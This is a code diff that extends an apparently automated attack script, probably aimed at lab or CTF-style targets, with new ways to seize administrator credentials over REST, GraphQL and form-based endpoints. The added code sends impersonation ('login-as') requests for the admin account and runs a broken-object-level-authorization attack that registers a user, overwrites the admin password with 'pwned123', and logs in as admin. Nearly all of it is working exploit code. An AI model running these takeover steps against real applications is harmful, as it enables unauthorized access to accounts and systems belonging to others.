@@ -211,6 +211,18 @@ def admin_creds(eps, auth, facts):
         for lp in eps.get("login", []):
             s, t, h = post(lp, {"username": un, "password": "pw12345"}); c = cred_from_login(auth, t, h)
             if c: cands.append(("mass-assign", c))
+    # login-as / impersonation — mint an admin credential with no admin check
+    for p in eps.get("login-as", []):
+        s, t, h = post(p, {"username": ADM}); c = cred_from_login(auth, t, h)
+        if c: cands.append(("login-as", c))
+    # bola-write — user foothold, overwrite the admin password, then log in as admin
+    for p in eps.get("profile-write", []):
+        uc = get_user_cred(eps, auth)
+        if uc:
+            post(p, {"username": ADM, "password": "pwned123"}, uc)
+            for lp in eps.get("login", []):
+                s, t, h = post(lp, {"username": ADM, "password": "pwned123"}); c = cred_from_login(auth, t, h)
+                if c: cands.append(("bola-write", c))
     # login with recovered password (easiest — last)
     for p in eps.get("login", []):
         if pw:
@@ -433,6 +445,21 @@ def gql_admin_creds(views, auth, facts):
         d = jparse(t) or {}; li = ((d.get("data") or {}).get("login") or {})
         c = gql_cred_from_login(li, h)
         if c: cands.append(("mass-assign", c))
+        # login-as / impersonation
+        s, t, h = gql('mutation($b:String!,$u:String!){ loginAs(block:$b, username:$u){ token apiKey user{ username role } } }', {"b": v["id"], "u": ADM})
+        d = jparse(t) or {}; la = ((d.get("data") or {}).get("loginAs") or {})
+        c = gql_cred_from_login(la, h)
+        if c: cands.append(("login-as", c))
+        # bola-write: register/login a user, overwrite the admin password, then log in as admin
+        un2 = "uw" + str(int(time.time() * 1000) % 1000000)
+        gql('mutation($b:String!,$u:String!,$p:String!){ register(block:$b, username:$u, password:$p){ ok } }', {"b": v["id"], "u": un2, "p": "pw12345"})
+        s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": un2, "p": "pw12345"})
+        d = jparse(t) or {}; ucred = gql_cred_from_login(((d.get("data") or {}).get("login") or {}), h)
+        if ucred:
+            gql('mutation($b:String!,$u:String!,$p:String!){ profileWrite(block:$b, username:$u, password:$p) }', {"b": v["id"], "u": ADM, "p": "pwned123"}, ucred)
+            s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": ADM, "p": "pwned123"})
+            d = jparse(t) or {}; c = gql_cred_from_login(((d.get("data") or {}).get("login") or {}), h)
+            if c: cands.append(("bola-write", c))
         # creds-login with recovered password
         if facts.get("password"):
             s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": ADM, "p": facts["password"]})
@@ -644,6 +671,17 @@ def trad_admin_creds(views, auth, facts):
         trad_post("/b/" + slug + "/register", {"username": un, "password": "pw12345", "role": "admin"})
         s, t, h = trad_post("/b/" + slug + "/login", {"username": un, "password": "pw12345"}); c = trad_cred(auth, mj(t) or {}, h)
         if c: cands.append(("mass-assign", c))
+        # login-as / impersonation
+        s, t, h = trad_post("/b/" + slug + "/login-as", {"username": ADM}); c = trad_cred(auth, mj(t) or {}, h)
+        if c: cands.append(("login-as", c))
+        # bola-write: user foothold -> overwrite admin password -> login as admin
+        un2 = "uw" + str(int(time.time() * 1000) % 1000000)
+        trad_post("/b/" + slug + "/register", {"username": un2, "password": "pw12345"})
+        s, t, h = trad_post("/b/" + slug + "/login", {"username": un2, "password": "pw12345"}); uc = trad_cred(auth, mj(t) or {}, h)
+        if uc:
+            trad_post("/b/" + slug + "/profile-write", {"username": ADM, "password": "pwned123"}, uc)
+            s, t, h = trad_post("/b/" + slug + "/login", {"username": ADM, "password": "pwned123"}); c = trad_cred(auth, mj(t) or {}, h)
+            if c: cands.append(("bola-write", c))
         if facts.get("password"):
             s, t, h = trad_post("/b/" + slug + "/login", {"username": ADM, "password": facts["password"]}); c = trad_cred(auth, mj(t) or {}, h)
             if c: cands.append(("creds-login", c))
